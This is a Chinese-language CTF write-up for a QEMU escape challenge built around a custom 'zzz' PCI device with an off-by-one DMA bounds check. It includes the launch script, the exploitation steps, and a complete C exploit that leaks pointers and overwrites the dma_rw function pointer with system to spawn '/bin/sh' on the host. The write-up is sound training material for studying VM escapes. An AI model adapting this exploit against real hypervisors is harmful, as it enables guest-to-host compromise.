
# 说明
这是一道qemu逃逸题，在程序启动时添加了一个设备zzz，zzz设备中预留了一个off by one的漏洞。

* zzz的代码是基于edu.c的代码进行编写的

启动脚本
```
#! /bin/sh
#gdb --args \
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./bzImage \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1 quiet kalsr' \
-monitor /dev/null \
-m 64M --nographic \
-device zzz \
-L pc-bios
```

漏洞位置
```
if ( obj->idx + cnt - 1 > DMA_SIZE )
{
    return ;
}
```

# 利用过程

1. 通过单字节溢出泄露设备地址的最后一位
2. 修改最后一位导致设备基址发生变化，设备中变量位置发生偏移
3. 在dma_buf中预留数据，设备发生偏移时，可以控制地址，长度，偏移的内容
4. 根据新的偏移和长度，泄露出堆地址和程序地址
5. 通过xor操作修改长度和偏移，修改读写标志位，导致从写到读
6. 向dma_rw函数指针地址写入system，在对齐的偏移处写入要执行的命令

```c
int main(int argc, char *argv[])
{
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED)
        die("mmap");
    
    mlock(userbuf, 0x1000);
    phy_userbuf=gva_to_gpa(userbuf);
    
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
    {
        die("open resource0 faild\n");
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio_mem == MAP_FAILED)
    {
        die("mmap faild\n");
    }
    
    printf("addr %p,0x%lx\n",userbuf,phy_userbuf);
    
    // set dma addr
    mmio_write(0x20,phy_userbuf >> 12);
     
    //memcpy(userbuf,"/bin/sh\x00",8);
    // addr
    *(uint64_t*)(userbuf + 0x11) = phy_userbuf;
    // cnt
    *(uint16_t*)(userbuf + 0x11 +8) = 0xff5;
    // idx
    *(uint16_t*)(userbuf + 0x11 +8+2) = 11;
    
    set_idx(0);
    set_cnt(0x30);
    mmio_write(0x60,0);
        
    set_idx(0x1000-1);
    set_cnt(2|1);
    mmio_write(0x60,0);
    uint8_t off = userbuf[1];
    
    printf("leak = %hhx\n",off);
    
    // cnt
    *(uint16_t*)(userbuf) = 0xff5;
    // idx
    *(uint16_t*)(userbuf+2) = 11;
    
    userbuf[0x1000-0x19] = off + 0x21;
 
    set_idx(0x19);
    set_cnt(0x1000-0x19+1);
    mmio_write(0x60,0);
    
    // new buf = dma_buf + 0x21;

    // leak ptr
    mmio_write(0x60,0);
    uint64_t device = *(uint64_t*)&userbuf[0x1000-0x21-11];
    uint64_t dma_rw = *(uint64_t*)&userbuf[0x1000-0x21-11+8];
    uint64_t dma_buf = device + 0x9cf;
    
    printf("device = 0x%lx\n",device);
    printf("dma_rw = 0x%lx\n",dma_rw);
    
    // encrypt
    mmio_write(0x50,0);
    // idx = 11 ^ 521 = 514
    // cnt = 0xff5 ^ 521 = 0xdfc
    
    uint64_t start = dma_buf + 0x21 + 514;
    uint64_t align = (start + 0xfff) & ~0xfff;
    
    assert(align <= start + 0xdfc);
    
    printf("start = 0x%lx\n",start);
    printf("align = 0x%lx\n",align);
    
    *(uint64_t *)userbuf = align;
    *(uint16_t *)(userbuf + 8) = 0;
    *(uint16_t *)(userbuf + 8 + 2) = 0;
    
    char cmd[] = "/bin/sh\x00";
    memcpy(userbuf + (align - start),cmd,sizeof(cmd));
    
    // idx = 514
    *(uint64_t *)&userbuf[0x1000-0x21-514] = device + 514 + 0x10;  
    *(uint64_t *)&userbuf[0x1000-0x21-514+8] = dma_rw - 0x314b40; 

    // write
    mmio_write(0x60,0);
    mmio_write(0x60,0);
}
```
